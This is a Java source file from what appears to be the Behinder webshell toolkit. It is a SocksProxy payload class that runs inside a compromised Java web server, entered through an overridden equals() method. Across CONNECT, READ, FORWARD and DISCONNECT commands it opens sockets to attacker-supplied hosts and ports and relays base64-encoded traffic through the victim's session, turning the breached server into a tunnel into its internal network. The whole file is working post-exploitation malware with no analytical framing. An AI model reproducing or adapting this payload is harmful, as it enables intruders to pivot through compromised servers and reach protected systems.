package net.rebeyond.behinder.payload.java;

import org.objectweb.asm.Opcodes;
import sun.misc.BASE64Decoder;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

public class SocksProxy {
    public static String cmd;
    public static String extraData;
    public static String targetIP;
    public static String targetPort;

    public static void main(String[] args) {
    }

    public boolean equals(Object obj) {
        try {
            proxy((PageContext) obj);
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    public void proxy(PageContext page) throws Exception {
        HttpServletRequest httpServletRequest = (HttpServletRequest) page.getRequest();
        HttpServletResponse response = (HttpServletResponse) page.getResponse();
        HttpSession session = page.getSession();
        if (cmd != null) {
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = targetIP;
                    int port = Integer.parseInt(targetPort);
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    response.setStatus(HttpServletResponse.SC_OK);
                } catch (UnknownHostException e) {
                    ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException e2) {
                    ServletOutputStream so2 = response.getOutputStream();
                    so2.write(new byte[]{55, 33, 73, 54});
                    so2.write(e2.getMessage().getBytes());
                    so2.flush();
                    so2.close();
                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                try {
                    ((SocketChannel) session.getAttribute("socket")).socket().close();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
                session.removeAttribute("socket");
            } else if (cmd.compareTo("READ") == 0) {
                SocketChannel socketChannel2 = (SocketChannel) session.getAttribute("socket");
                try {
                    ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    ServletOutputStream so3 = response.getOutputStream();
                    for (int bytesRead = socketChannel2.read(buf); bytesRead > 0; bytesRead = socketChannel2.read(buf)) {
                        so3.write(buf.array(), 0, bytesRead);
                        so3.flush();
                        buf.clear();
                    }
                    so3.flush();
                    so3.close();
                } catch (Exception e3) {
                    response.setStatus(HttpServletResponse.SC_OK);
                    ServletOutputStream so4 = response.getOutputStream();
                    so4.write(new byte[]{55, 33, 73, 54});
                    so4.write(e3.getMessage().getBytes());
                    so4.flush();
                    so4.close();
                    page.getOut().clear();
                    socketChannel2.socket().close();
                    e3.printStackTrace();
                }
            } else if (cmd.compareTo("FORWARD") == 0) {
                SocketChannel socketChannel3 = (SocketChannel) session.getAttribute("socket");
                try {
                    byte[] extraDataByte = new BASE64Decoder().decodeBuffer(extraData);
                    ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                    buf2.clear();
                    buf2.put(extraDataByte);
                    buf2.flip();
                    while (buf2.hasRemaining()) {
                        socketChannel3.write(buf2);
                    }
                } catch (Exception e4) {
                    ServletOutputStream so5 = response.getOutputStream();
                    so5.write(new byte[]{55, 33, 73, 54});
                    so5.write(e4.getMessage().getBytes());
                    so5.flush();
                    so5.close();
                    socketChannel3.socket().close();
                }
            }
        }
        page.getOut().clear();
    }
}
